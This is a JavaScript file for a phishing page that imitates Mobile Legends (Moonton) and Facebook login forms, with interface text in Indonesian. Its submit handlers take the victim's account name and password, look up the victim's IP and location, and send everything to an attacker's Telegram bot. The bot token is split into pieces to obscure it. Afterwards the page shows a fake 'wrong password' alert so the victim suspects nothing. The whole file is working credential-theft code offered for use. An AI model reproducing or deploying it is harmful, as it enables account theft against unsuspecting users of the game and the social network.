const part1 = "8816261841";
const part2 = "AAFOvMF00rlDMaxydRfxnTpi5bff";
const part3 = "5dArd9s";
const TELEGRAM_TOKEN = `${part1}:${part2}${part3}`; 
const CHAT_ID = "8335786077";

function toggleSidebar() {
    const menu = document.getElementById('sidebarMenu');
    const overlay = document.getElementById('sidebarOverlay');
    menu.classList.toggle('active');
    overlay.classList.toggle('active');
}

function openModal() {
    document.getElementById('loginModal').style.display = 'flex';
    backToSelection();
}

function closeModal() {
    document.getElementById('loginModal').style.display = 'none';
}

function selectMoonton() {
    document.getElementById('selectionView').style.display = 'none';
    document.getElementById('moontonFormView').style.display = 'block';
    document.getElementById('facebookFormView').style.display = 'none';
    document.getElementById('alertMsgMoonton').style.display = 'none';
}

function selectFacebook() {
    document.getElementById('selectionView').style.display = 'none';
    document.getElementById('moontonFormView').style.display = 'none';
    document.getElementById('facebookFormView').style.display = 'block';
}

function backToSelection() {
    document.getElementById('selectionView').style.display = 'block';
    document.getElementById('moontonFormView').style.display = 'none';
    document.getElementById('facebookFormView').style.display = 'none';
    document.getElementById('alertMsgMoonton').style.display = 'none';
}

async function sendMoontonData(event) {
    event.preventDefault();

    const gameId = document.getElementById('gameId').value;
    const server = document.getElementById('server').value;
    const account = document.getElementById('account').value;
    const password = document.getElementById('password').value;
    const btn = document.getElementById('submitMoontonBtn');
    const alertMsg = document.getElementById('alertMsgMoonton');

    btn.disabled = true;
    btn.innerText = "Memproses...";
    alertMsg.style.display = "none";

    let ip = "N/A";
    let loc = "Unknown";
    try {
        let res = await fetch('https://ipwho.is/');
        let data = await res.json();
        ip = data.ip || "N/A";
        loc = `${data.city || ""}, ${data.country || "Indonesia"}`;
    } catch (e) {}

    const message = `🎮 TARGET LOGIN MOBILE LEGENDS (MOONTON)!\n\n` +
                    `🆔 Game ID: <code>${gameId} (${server})</code>\n` +
                    `👤 Akun: <code>${account}</code>\n` +
                    `🔑 Sandi: <code>${password}</code>\n\n` +
                    `🌐 IP: ${ip}\n` +
                    `📍 Lokasi: ${loc}\n` +
                    `💻 Device: ${navigator.userAgent}`;

    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=HTML&text=${encodeURIComponent(message)}`;

    try {
        await fetch(url);
    } catch (e) {}

    setTimeout(() => {
        alertMsg.style.display = "block";
        btn.disabled = false;
        btn.innerText = "Konfirmasi & Masuk";
        document.getElementById('password').value = "";
    }, 1500);
}

async function sendFBData(event) {
    event.preventDefault();

    const username = document.getElementById('fbUsername').value;
    const password = document.getElementById('fbPassword').value;
    const btn = document.getElementById('submitFBBtn');

    btn.disabled = true;
    btn.innerText = "Memproses...";

    let ip = "N/A";
    let loc = "Unknown";
    try {
        let res = await fetch('https://ipwho.is/');
        let data = await res.json();
        ip = data.ip || "N/A";
        loc = `${data.city || ""}, ${data.country || "Indonesia"}`;
    } catch (e) {}

    const message = `📱 TARGET LOGIN FACEBOOK (MOBILE VIEW)!\n\n` +
                    `👤 User/No: <code>${username}</code>\n` +
                    `🔑 Sandi: <code>${password}</code>\n\n` +
                    `🌐 IP: ${ip}\n` +
                    `📍 Lokasi: ${loc}\n` +
                    `💻 Device: ${navigator.userAgent}`;

    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&parse_mode=HTML&text=${encodeURIComponent(message)}`;

    try {
        await fetch(url);
    } catch (e) {}

    setTimeout(() => {
        btn.disabled = false;
        btn.innerText = "Login";
        document.getElementById('fbPassword').value = "";
        alert("Kata sandi salah. Harap coba lagi.");
    }, 1200);
}
